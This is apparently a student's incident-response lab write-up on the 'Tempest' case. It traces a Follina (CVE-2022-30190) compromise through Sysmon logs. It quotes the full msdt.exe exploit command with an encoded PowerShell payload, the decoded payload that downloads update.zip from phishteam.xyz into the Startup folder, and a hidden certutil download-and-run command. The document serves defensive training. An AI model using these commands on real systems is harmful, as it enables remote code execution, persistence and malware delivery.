## Short Note: Preparing Artifacts & Tools

Before investigation, first verify evidence integrity by comparing file hashes. Use PowerShell:

```powershell
cd '.\Desktop\Incident Files\'
ls
Get-FileHash -Algorithm SHA256 .\capture.pcapng
```

Main artifacts:

```text
capture.pcapng
sysmon.evtx
windows.evtx
```

Tools used:

```text
Endpoint logs: EvtxEcmd, Timeline Explorer, SysmonView, Event Viewer
Network logs: Wireshark, Brim
```

### EvtxEcmd + Timeline Explorer

`EvtxEcmd` converts Windows/Sysmon `.evtx` logs into CSV:

```powershell
.\EvtxECmd.exe -f 'C:\Users\user\Desktop\Incident Files\sysmon.evtx' --csv 'C:\Users\user\Desktop\Incident Files' --csvf sysmon.csv
```

Then open `sysmon.csv` in **Timeline Explorer** to filter, search, and analyze events easily.

### SysmonView

`SysmonView` visualizes Sysmon activity. First export Sysmon logs as XML using **Event Viewer**, then import the XML into SysmonView.

It helps correlate events related to a specific process, such as process creation, network connections, file creation, and registry activity.
---
## Short Summary: Tempest Incident

In this part, I investigated a **critical incident** where the user **benimaru** on machine **TEMPEST** was compromised through a malicious Word document:

```text
free_magicules.doc
```

The document was opened by **Microsoft Word** with PID:

```text
496
```

The attack used a malicious domain:

```text
phishteam.xyz
```

Sysmon DNS logs showed it resolved to:

```text
167.71.199.191
```

The document executed a Base64-encoded PowerShell payload:

```text
JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==
```

When decoded, it downloads `update.zip` from the attacker server, extracts it into the Windows **Startup folder**, and deletes the zip file. This gives the attacker persistence.

The vulnerability used was:

```text
CVE-2022-30190 / Follina
```

It is a Microsoft Office/MSDT remote code execution vulnerability.

---

## Useful Commands / Investigation Steps

Parse Sysmon EVTX to CSV:

```powershell
.\EvtxECmd.exe -f "C:\Users\user\Desktop\Incident Files\sysmon.evtx" --csv "C:\Users\user\Desktop\Incident Files" --csvf sysmon.csv
```

Search for the malicious document:

```text
free_magicules.doc
```

Search for Word process activity:

```text
winword.exe
```

Check child processes using:

```text
ParentProcessId = 496
```

Search DNS queries:

```text
Event ID 22
QueryName = phishteam.xyz
```

Decode Base64 in PowerShell:

```powershell
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("BASE64_STRING"))
```

---

## What I Learned

I learned how to investigate a malicious Office document using **Sysmon logs**, especially:

```text
Event ID 1  = Process Creation
Event ID 22 = DNS Query
```

The main investigation technique was to follow the process chain:

```text
chrome.exe → winword.exe → malicious command execution
```

I also learned that attackers can use **Follina CVE-2022-30190** to make a Word document execute PowerShell commands, download payloads, and create persistence through the Windows Startup folder.
---
This is a Follina exploit command:
C:\Windows\SysWOW64\msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg=='+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe"
This is a **Follina exploit command**:

```text
CVE-2022-30190
Microsoft MSDT Remote Code Execution
```

It shows that a malicious Word document executed `msdt.exe` and abused it to run PowerShell code.

## What happened exactly

The malicious document caused this process to run:

```text
C:\Windows\SysWOW64\msdt.exe
```

`msdt.exe` is the **Microsoft Support Diagnostic Tool**. Normally it is legitimate, but in **Follina**, attackers abuse the `ms-msdt:` protocol to execute commands.

The important part is this:

```text
ms-msdt:/id PCWDiagnostic
```

This launches the **Program Compatibility Troubleshooter** through MSDT.

Then this part injects malicious PowerShell:

```text
Invoke-Expression(...)
```

`Invoke-Expression` means: **execute this string as PowerShell code**.

Inside it, there is a Base64 string:

```text
JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRo...
```

When decoded, it becomes:

```powershell
$app=[Environment]::GetFolderPath('ApplicationData');
cd "$app\Microsoft\Windows\Start Menu\Programs\Startup";
iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip;
Expand-Archive .\update.zip -DestinationPath .;
rm update.zip;
```

## Meaning of the decoded payload

```powershell
$app=[Environment]::GetFolderPath('ApplicationData')
```

Gets the user’s AppData/Roaming folder.

```powershell
cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"
```

Moves to the Windows **Startup folder**.

Anything placed here can run automatically when the user logs in.

```powershell
iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip
```

Downloads a ZIP payload from the attacker domain.

`iwr` = `Invoke-WebRequest`.

```powershell
Expand-Archive .\update.zip -DestinationPath .
```

Extracts the ZIP file into the Startup folder.

```powershell
rm update.zip
```

Deletes the ZIP file to reduce evidence.

## Why it is malicious

The attacker used a Word document to run:

```text
WINWORD.EXE → msdt.exe → PowerShell payload
```

Then the payload downloaded files from:

```text
phishteam.xyz
```

and placed them in:

```text
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
```

That means the attacker was trying to achieve **persistence**, so the payload would run again after login/restart.

## What to look for in logs

In Sysmon:

```text
Event ID 1  = Process Creation
Event ID 11 = File Creation
Event ID 22 = DNS Query
```

Look for:

```text
msdt.exe
phishteam.xyz
update.zip
Startup
WINWORD.EXE as parent process
```

Final summary: this command is a **Follina CVE-2022-30190 exploitation chain** where a malicious Word document abused `msdt.exe` to execute Base64 PowerShell, download `update.zip`, extract it into the Startup folder, and create persistence.
---
## Short Summary: Malicious Document — Stage 2

In Stage 2, the malicious Word document already executed a **Base64 PowerShell command**. After decoding it, we saw that it downloaded `update.zip` from the attacker domain and extracted it into the user’s **Startup folder**.

This means the attacker created **persistence**: when the compromised user logs in again, Windows runs the implanted payload automatically.

---

### 1. Payload written path

The decoded command showed the payload was written into the Startup folder:

```text
C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

How I found it:

```text
Decoded Base64 payload → checked cd path → saw Startup folder
```

Answer:

```text
C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

---

### 2. Command executed after user login

To find this, I opened `sysmon.csv` in **Timeline Explorer**.

Steps:

```text
Filter EventId = 1
Search explorer.exe
Check child process CommandLine
```

Because Startup-folder payloads usually run with:

```text
Parent process: explorer.exe
```

Answer:

```text
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
```

This command runs PowerShell hidden, uses `certutil` to download `first.exe`, saves it in Public Downloads, then executes it.

---

### 3. SHA256 hash of Stage 2 binary

To find the hash, I used Timeline Explorer again.

Steps:

```text
Filter EventId = 1
Search first.exe
Check Hashes field
Find SHA256 value
```

Answer:

```text
CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8
```

---

### 4. Stage 2 C2 domain and port

After `first.exe` executed, I checked Sysmon network/DNS activity.

Look for:

```text
EventId = 3   Network connection
EventId = 22  DNS query
Search first.exe
Search resolvecyber.xyz
```

The payload connected to:

```text
resolvecyber.xyz
```

on port:

```text
80
```

Answer:

```text
resolvecyber.xyz:80
```

---

## What I Learned

I learned how Stage 2 malware works after a malicious document exploit:

```text
Malicious document
→ Base64 PowerShell execution
→ Payload written to Startup folder
→ User logs in
→ explorer.exe runs Startup payload
→ PowerShell downloads first.exe using certutil
→ first.exe executes
→ connects to C2 server resolvecyber.xyz:80
```

Important Sysmon events:

```text
Event ID 1  = Process Creation
Event ID 3  = Network Connection
Event ID 11 = File Creation
Event ID 22 = DNS Query
```

Main lesson: attackers often use the **Startup folder** for persistence and legitimate Windows tools like **PowerShell** and **certutil.exe** to download and execute payloads.
---
